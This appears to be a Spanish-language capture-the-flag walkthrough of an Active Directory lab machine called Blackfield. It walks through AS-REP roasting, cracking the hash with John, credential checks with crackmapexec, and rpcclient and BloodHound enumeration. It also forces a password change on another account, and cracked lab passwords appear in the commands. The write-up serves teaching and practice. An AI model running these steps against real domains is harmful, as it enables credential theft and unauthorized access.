## Vulnerability Assessment {-}

### Asproasting Attack {-}

Una vez que tenemos un listado de usuarios, podemos hacer un **asproating attack**

1. copiamos todos los usuarios en un fichero llamado users

    ```bash
    nano users_dir
    Ctrl+shift+v

    cat users_dir | awk '{print $1}' > users
    rm users_dir
    ```

1. Con `GetNPUsers.py` vamos a ver si podemos recuperar un TGT

    ```bash
    GetNPUsers blackfield.local/ -no-pass -usersfile users | grep -v "not found"
    ```

Aqui vemos el TGT del usuario **support**. Esto quiere decir que este usuario tenia el *Don't required pre-auth* seteado. Copiamos todo el hash 
del usuario svc-alfresco en un fichero llamado hash y lo crackeamos con John


### Crackeando el hash con John {-}

```bash
john -wordlists=/usr/share/wordlists/rockyou.txt hash
```

Aqui encontramos su contraseña. Ya podemos effectuar un Kerberoasting attack. Pero primero, como siempre, credenciales encontradas son 
credenciales que checkeamos con crackmapexec

```bash
crackmapexec smb 10.10.10.192 -u 'support' -p '#00^BlackKnight'
```

Aprovechamos para ver si nos podemos conectar via winrm.

```bash
crackmapexec winrm 10.10.10.192 -u 'support' -p '#00^BlackKnight'
```

Aqui vemos que el usuario es valido y que tiene permiso de lectura sobre el directorio **SYSVOL** y que lo normal seria de buscar si existe un
fichero `groups.xml`, porque a dentro tienes un `cpassword=HASH` que contiene un hash que se podria crackear con la heramienta **gpp-decrypt** pero 
Tito no adelanta que no es el caso no se aplicaba.

### Kereroasting attack {-}

Los ataques Kereroasting se pueden manejar con la utilidad `GetUserSPNs.py`

```bash
GetUserSPNs.py blackfield.local/support:#00^BlackKnight@10.10.10.192 -request -dc-ip 10.10.10.192
```

Esta utilidad nos retorna un mensaje como que no son las buenas credenciales.

### Enumeracion de usuarios con rpcclient {-}

Ahora que tenemos credenciales validas, intentamos connectarnos al `rpcclient`

```bash
rpcclient -U "support%#00^BlackKnight" 10.10.10.192

> rpcclient $> enumdomusers
```

Ahora podemos ver la lista de los usuarios registrados a nivel de systema. Buscamos usuarios del grupo Admins via la busqueda de los diferentes grupos.

```bash
> rpcclient $> enumdomgroups
```

copiamos el rid del grupo `Domain Admins` 

```bash
> rpcclient $> querygroupmem 0x200
```

Aqui podemos ver el **rid** del usuario que hace parte del grupo admin.

```bash
> rpcclient $> queryuser 0x1f4
```

Vemos quel usuario es **Administrator**, pero lo hacemos para saber si hay otros usuarios administradores pero aqui no es el caso.

### Enumeracion del systema con bloodhound-python para ganar acceso a la maquina {-}

Con la utilidad `bloodhound-python`, podemos enumerar cosas si tener que estar connectado a la maquina victima.

1. instalamos bloodhound

    ```bash
    pip3 install bloodhound
    ```

1. lanzamos bloodhound-python

    ```bash
    bloodhound-python
    bloodhound-python -c ALL -u support -p '#00^BlackKnight' -ns 10.10.10.192 -dc dc01.blackfield.local -d blackfield.local 
    ```

    esto nos crea un reporte en formato json.

1. instalamos bloodhound y neo4j

    ```bash
    sudo apt install neo4j bloodhound
    ```

1. lanzamos neo4j service

    ```bash
    sudo neo4j console
    ```

1. lanzamos bloodhound

    ```bash
    bloodhound --no-sandbox &> /dev/null &
    disown
    ```

1. connectamos bloodhound al neo4j database

1. Drag & Drop de los ficheros **.json** hacia la ventana del bloodhound y en el Analysis tab

    - Find Shortest Paths to Domain Admins
    - Find Paths from Kerberoastable Users
    - Find AS-REP Roastable Users
    

Aqui no vemos gran cosa, lo unico el usuario support que es asreproasteable pero poco mas. Analizamos los nodos de este usuario.
Le damos un clic derecho al usuario y lo seteamos a Mark User as Owned.
Vamos a Node Info y miramos donde hay un 1.

Vemos que el usuario **support** puede forzar un cambio de contraseña al usuario **AUDIT2020**  


### Forzar un cambio de contraseña con rpcclient {-}

```bash
rpcclient -U "support%#00^BlackKnight" 10.10.10.192

> rpcclient $> setuserinfo2 audit2020 24 s4vitar123$!
```

Ahora que hemos cambiado la contraseña, lo miramos con **crackmapexec**

```bash
crackmapexec smb 10.10.10.192 -u 'audit2020' -p 's4vitar123$!'
```

El cambio de contraseña a sido effectiva y ahora miramos que privilegios tiene en los recursos compartidos tiene a nivel de red.

```bash
smbmap -H 10.10.10.192 -u 'audit2020' -p 's4vitar123$!'
```

Vemos que este usuario tiene privilegios de lectura sobre el directorio `forensic`. Miramos lo que hay en este directorio.




